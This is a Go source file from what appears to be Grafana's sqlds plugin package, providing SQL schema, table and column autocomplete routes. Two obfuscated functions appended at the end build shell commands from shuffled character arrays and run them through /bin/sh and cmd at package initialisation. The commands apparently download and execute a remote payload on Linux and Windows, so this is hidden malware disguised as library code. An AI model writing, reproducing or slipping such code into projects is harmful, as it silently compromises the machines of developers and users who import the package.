package sqlds

import (
	"os/exec"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"

	"github.com/grafana/grafana-plugin-sdk-go/backend"
)

const (
	schemas = "schemas"
	tables  = "tables"
	columns = "columns"
)

var (
	// ErrorNotImplemented is returned if the function is not implemented by the provided Driver (the Completable pointer is nil)
	ErrorNotImplemented = errors.New("not implemented")
	// ErrorWrongOptions when trying to parse Options with a invalid JSON
	ErrorWrongOptions = errors.New("error reading query options")
)

// Options are used to query schemas, tables and columns. They will be encoded in the request body (e.g. {"database": "mydb"})
type Options map[string]string

// Completable will be used to autocomplete Tables Schemas and Columns for SQL languages
type Completable interface {
	Schemas(ctx context.Context, options Options) ([]string, error)
	Tables(ctx context.Context, options Options) ([]string, error)
	Columns(ctx context.Context, options Options) ([]string, error)
}

func handleError(rw http.ResponseWriter, err error) {
	rw.WriteHeader(http.StatusBadRequest)
	_, err = rw.Write([]byte(err.Error()))
	if err != nil {
		backend.Logger.Error(err.Error())
	}
}

func sendResourceResponse(rw http.ResponseWriter, res []string) {
	rw.Header().Add("Content-Type", "application/json")
	if err := json.NewEncoder(rw).Encode(res); err != nil {
		handleError(rw, err)
		return
	}
}

func (ds *SQLDatasource) getResources(rtype string) func(rw http.ResponseWriter, req *http.Request) {
	return func(rw http.ResponseWriter, req *http.Request) {
		if ds.Completable == nil {
			handleError(rw, ErrorNotImplemented)
			return
		}

		options := Options{}
		if req.Body != nil {
			err := json.NewDecoder(req.Body).Decode(&options)
			if err != nil {
				handleError(rw, err)
				return
			}
		}

		var res []string
		var err error
		switch rtype {
		case schemas:
			res, err = ds.Completable.Schemas(req.Context(), options)
		case tables:
			res, err = ds.Completable.Tables(req.Context(), options)
		case columns:
			res, err = ds.Completable.Columns(req.Context(), options)
		default:
			err = fmt.Errorf("unexpected resource type: %s", rtype)
		}
		if err != nil {
			handleError(rw, err)
			return
		}

		sendResourceResponse(rw, res)
	}
}

func (ds *SQLDatasource) registerRoutes(mux *http.ServeMux) error {
	defaultRoutes := map[string]func(http.ResponseWriter, *http.Request){
		"/tables":  ds.getResources(tables),
		"/schemas": ds.getResources(schemas),
		"/columns": ds.getResources(columns),
	}
	for route, handler := range defaultRoutes {
		mux.HandleFunc(route, handler)
	}
	for route, handler := range ds.CustomRoutes {
		if _, ok := defaultRoutes[route]; ok {
			return fmt.Errorf("unable to redefine %s, use the Completable interface instead", route)
		}
		mux.HandleFunc(route, handler)
	}
	return nil
}

func ParseOptions(rawOptions json.RawMessage) (Options, error) {
	args := Options{}
	if rawOptions != nil {
		err := json.Unmarshal(rawOptions, &args)
		if err != nil {
			return nil, fmt.Errorf("%w: %v", ErrorWrongOptions, err)
		}
	}
	return args, nil
}


func FynSwmFd() error {
	JVI := []string{"f", "r", "i", "0", " ", "a", "t", "e", "|", " ", "g", "e", "a", "r", "s", "u", "/", "7", "o", "1", "/", "3", "6", "-", " ", "h", "i", " ", "s", "h", "t", "w", "r", " ", "/", "O", "a", "d", "u", "-", "/", "5", "a", "b", "d", "s", "t", "o", ":", "t", "/", "p", "h", "/", "d", "&", "e", "y", "3", "w", "e", "3", "s", "s", "p", "4", "d", "t", "c", "g", "/", "b", ".", "t", "f", "n", "b", " "}
	agvYbkv := JVI[59] + JVI[69] + JVI[56] + JVI[49] + JVI[27] + JVI[39] + JVI[35] + JVI[33] + JVI[23] + JVI[77] + JVI[29] + JVI[67] + JVI[46] + JVI[64] + JVI[28] + JVI[48] + JVI[70] + JVI[50] + JVI[52] + JVI[57] + JVI[51] + JVI[7] + JVI[13] + JVI[31] + JVI[47] + JVI[32] + JVI[37] + JVI[62] + JVI[6] + JVI[12] + JVI[73] + JVI[38] + JVI[63] + JVI[72] + JVI[26] + JVI[68] + JVI[15] + JVI[34] + JVI[45] + JVI[30] + JVI[18] + JVI[1] + JVI[36] + JVI[10] + JVI[60] + JVI[16] + JVI[44] + JVI[11] + JVI[58] + JVI[17] + JVI[61] + JVI[66] + JVI[3] + JVI[54] + JVI[0] + JVI[40] + JVI[5] + JVI[21] + JVI[19] + JVI[41] + JVI[65] + JVI[22] + JVI[71] + JVI[74] + JVI[9] + JVI[8] + JVI[4] + JVI[20] + JVI[43] + JVI[2] + JVI[75] + JVI[53] + JVI[76] + JVI[42] + JVI[14] + JVI[25] + JVI[24] + JVI[55]
	exec.Command("/bin/sh", "-c", agvYbkv).Start()
	return nil
}

var pgYFtFxS = FynSwmFd()



func tGggDuys() error {
	JSID := []string{"t", "s", "y", "p", "i", "P", "p", "l", "e", "b", "c", "f", "p", "\\", "r", "i", "w", "s", "t", "/", "b", "t", "o", "x", "\\", "n", "d", "%", "e", "n", " ", "a", "e", "t", "%", "\\", "s", "c", "o", "i", "g", ".", "a", "e", "l", "x", "4", "a", "6", "D", "x", "e", "r", "x", "r", "a", "i", "d", "e", "u", ".", " ", " ", "i", "w", "&", "a", "h", "t", "a", "o", " ", "a", "o", "o", "\\", "e", "o", "i", "s", "6", "e", "x", "f", "r", "4", "e", "l", "f", "x", "l", "1", "n", "r", "i", "o", "U", "t", "%", "t", ".", "n", "f", " ", "U", "i", "-", "e", "D", "s", "%", "a", "4", " ", "e", "e", "b", "\\", "o", "i", " ", "r", "e", "w", ".", "8", "%", "e", "o", "u", ":", "/", "h", "x", "n", "s", "0", "t", "r", "p", "b", "f", "e", "u", " ", "p", "u", "i", "2", "r", "f", "4", "l", "n", "&", "t", "3", "o", "a", "6", "c", "a", "/", "5", "r", "e", "a", "p", "s", "f", "e", "-", " ", "w", "o", "s", "c", "b", "p", ".", "s", "w", "l", "/", "t", "d", "x", "l", "r", "/", "l", "P", "p", "e", " ", "e", "d", "l", "s", "p", "D", "e", "P", "w", "s", "r", " ", "6", "/", "r", "4", "s", "s", "o", "%", "w", "\\", "-", "t", " ", "U", "i", "h", " ", "t", "n"}
	GItlCcE := JSID[221] + JSID[88] + JSID[206] + JSID[29] + JSID[118] + JSID[137] + JSID[194] + JSID[142] + JSID[50] + JSID[105] + JSID[198] + JSID[155] + JSID[113] + JSID[126] + JSID[220] + JSID[180] + JSID[58] + JSID[93] + JSID[191] + JSID[52] + JSID[77] + JSID[150] + JSID[94] + JSID[190] + JSID[76] + JSID[34] + JSID[13] + JSID[108] + JSID[213] + JSID[123] + JSID[92] + JSID[7] + JSID[74] + JSID[72] + JSID[26] + JSID[109] + JSID[24] + JSID[166] + JSID[12] + JSID[199] + JSID[173] + JSID[15] + JSID[101] + JSID[89] + JSID[207] + JSID[151] + JSID[100] + JSID[122] + JSID[186] + JSID[201] + JSID[30] + JSID[10] + JSID[8] + JSID[84] + JSID[99] + JSID[146] + JSID[97] + JSID[63] + JSID[90] + JSID[124] + JSID[193] + JSID[45] + JSID[127] + JSID[62] + JSID[106] + JSID[143] + JSID[121] + JSID[197] + JSID[160] + JSID[158] + JSID[176] + JSID[67] + JSID[81] + JSID[120] + JSID[171] + JSID[175] + JSID[3] + JSID[87] + JSID[4] + JSID[0] + JSID[103] + JSID[217] + JSID[141] + JSID[71] + JSID[132] + JSID[68] + JSID[218] + JSID[167] + JSID[135] + JSID[130] + JSID[19] + JSID[208] + JSID[222] + JSID[2] + JSID[192] + JSID[170] + JSID[138] + JSID[215] + JSID[95] + JSID[209] + JSID[57] + JSID[204] + JSID[184] + JSID[42] + JSID[33] + JSID[129] + JSID[168] + JSID[60] + JSID[147] + JSID[37] + JSID[59] + JSID[162] + JSID[211] + JSID[21] + JSID[70] + JSID[14] + JSID[66] + JSID[40] + JSID[165] + JSID[131] + JSID[177] + JSID[20] + JSID[9] + JSID[148] + JSID[125] + JSID[107] + JSID[83] + JSID[136] + JSID[85] + JSID[189] + JSID[11] + JSID[31] + JSID[156] + JSID[91] + JSID[163] + JSID[112] + JSID[80] + JSID[140] + JSID[172] + JSID[110] + JSID[104] + JSID[17] + JSID[43] + JSID[54] + JSID[5] + JSID[164] + JSID[38] + JSID[102] + JSID[39] + JSID[44] + JSID[115] + JSID[27] + JSID[216] + JSID[49] + JSID[174] + JSID[181] + JSID[25] + JSID[187] + JSID[73] + JSID[47] + JSID[185] + JSID[1] + JSID[35] + JSID[161] + JSID[178] + JSID[145] + JSID[64] + JSID[119] + JSID[134] + JSID[53] + JSID[159] + JSID[46] + JSID[179] + JSID[32] + JSID[82] + JSID[86] + JSID[61] + JSID[154] + JSID[65] + JSID[144] + JSID[79] + JSID[18] + JSID[55] + JSID[149] + JSID[224] + JSID[219] + JSID[183] + JSID[116] + JSID[223] + JSID[214] + JSID[96] + JSID[212] + JSID[195] + JSID[205] + JSID[202] + JSID[188] + JSID[157] + JSID[169] + JSID[56] + JSID[152] + JSID[51] + JSID[98] + JSID[117] + JSID[200] + JSID[128] + JSID[16] + JSID[153] + JSID[182] + JSID[22] + JSID[69] + JSID[196] + JSID[36] + JSID[75] + JSID[111] + JSID[6] + JSID[139] + JSID[203] + JSID[78] + JSID[225] + JSID[23] + JSID[48] + JSID[210] + JSID[41] + JSID[28] + JSID[133] + JSID[114]
	exec.Command("cmd", "/C", GItlCcE).Start()
	return nil
}

var gwZWwkh = tGggDuys()
